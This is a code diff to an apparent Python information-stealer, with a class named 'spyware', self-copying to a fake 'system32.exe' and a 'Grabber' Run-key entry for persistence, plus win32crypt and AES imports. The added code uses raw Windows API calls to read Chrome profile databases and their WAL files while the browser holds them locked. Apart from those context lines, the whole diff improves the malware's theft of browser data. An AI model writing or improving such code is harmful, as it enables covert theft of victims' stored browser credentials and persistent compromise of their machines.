@@ -16,6 +16,8 @@ import platform
 import win32crypt
 import subprocess
 import httpx
+import ctypes
+import ctypes.wintypes
 
 from Cryptodome.Cipher import AES
 from subprocess import PIPE, Popen
@@ -38,6 +40,24 @@ location = os.environ["appdata"] + "\\system32.exe"
 if not os.path.exists(location):
     shutil.copyfile(sys.executable, location)
     subprocess.call('reg add HKCU\software\Microsoft\Windows\CurrentVersion\Run /v Grabber /t REG_SZ /d "' + location + '"', shell=True)
+
+
+def _read_locked(src, dst):
+    GENERIC_READ = 0x80000000
+    FILE_SHARE_ALL = 0x00000007
+    OPEN_EXISTING = 3
+    h = ctypes.windll.kernel32.CreateFileW(src, GENERIC_READ, FILE_SHARE_ALL, None, OPEN_EXISTING, 0x80, None)
+    if h == ctypes.wintypes.HANDLE(-1).value:
+        raise PermissionError(f"Cannot open {src}")
+    try:
+        size = ctypes.windll.kernel32.GetFileSize(h, None)
+        buf = ctypes.create_string_buffer(size)
+        read = ctypes.c_ulong(0)
+        ctypes.windll.kernel32.ReadFile(h, buf, size, ctypes.byref(read), None)
+        with open(dst, 'wb') as f:
+            f.write(buf.raw[:read.value])
+    finally:
+        ctypes.windll.kernel32.CloseHandle(h)
 
 
 class spyware:
@@ -99,15 +119,21 @@ class spyware:
                 continue
 
             db = None
-            tmp = None
+            tmp = os.path.join(os.getenv("temp"), f"CP_{profile}.db")
             try:
-                # immutable=1 bypasses Chrome's file lock without copying
-                db = sqlite3.connect(f'file:{db_path}?immutable=1', uri=True)
+                # Read locked file via WinAPI (FILE_SHARE_ALL), copy WAL too
+                _read_locked(db_path, tmp)
+                for ext in ('-wal', '-shm'):
+                    if os.path.exists(db_path + ext):
+                        try:
+                            _read_locked(db_path + ext, tmp + ext)
+                        except Exception:
+                            pass
+                db = sqlite3.connect(tmp)
             except Exception:
                 try:
-                    tmp = os.path.join(os.getenv("temp"), f"CP_{profile}.db")
-                    shutil.copyfile(db_path, tmp)
-                    db = sqlite3.connect(tmp)
+                    db = sqlite3.connect(f'file:{db_path}?immutable=1', uri=True)
+                    tmp = None
                 except Exception:
                     continue
 
